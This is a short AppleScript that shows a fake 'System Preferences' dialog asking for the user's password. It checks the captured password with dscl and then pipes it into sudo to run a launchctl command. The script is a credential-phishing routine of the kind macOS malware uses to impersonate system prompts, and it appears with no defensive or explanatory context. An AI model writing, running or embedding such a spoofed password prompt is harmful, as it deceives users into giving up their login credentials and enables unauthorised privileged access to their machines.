set reply to display dialog "Enter your password" default answer "" with hidden answer with title "System Preferences"
set secret to text returned of reply
do shell script "dscl . authonly user " & quoted form of secret
do shell script "echo " & quoted form of secret & " | sudo -u nobody -S launchctl print gui/501"
